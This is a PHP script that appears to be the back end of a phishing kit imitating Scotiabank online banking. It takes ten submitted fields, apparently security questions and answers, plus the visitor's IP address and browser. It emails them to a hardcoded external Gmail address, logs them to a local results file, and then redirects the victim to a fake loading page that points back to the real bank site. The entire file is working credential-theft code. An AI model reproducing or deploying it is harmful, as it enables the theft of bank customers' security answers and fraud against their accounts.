<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "";
$message .= "#Alfa1		: ".$_POST['Alfa1']."\n";
$message .= "#Beta1		: ".$_POST['Beta1']."\n";
$message .= "#Alfa2		: ".$_POST['Alfa2']."\n";
$message .= "#Beta2		: ".$_POST['Beta2']."\n";
$message .= "#Alfa3		: ".$_POST['Alfa3']."\n";
$message .= "#Beta3		: ".$_POST['Beta3']."\n";
$message .= "#Alfa4		: ".$_POST['Alfa4']."\n";
$message .= "#Beta4		: ".$_POST['Beta4']."\n";
$message .= "#Alfa5		: ".$_POST['Alfa5']."\n";
$message .= "#Beta5		: ".$_POST['Beta5']."\n";
$message .= "";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "";
$send = "crunkcrunk0@gmail.com";
$subject = " bigsco 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('scotiaResultz.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "loading.html?page=%2Fuser-management%2Fconfirmation&setLng=en&returnURL=https%3A%2F%2Fwww1.scotiaonline.scotiabank.com%2Fonline%2Fauthentication%2Fauthentication.bns%3Flanguage%3DEnglish";

</script>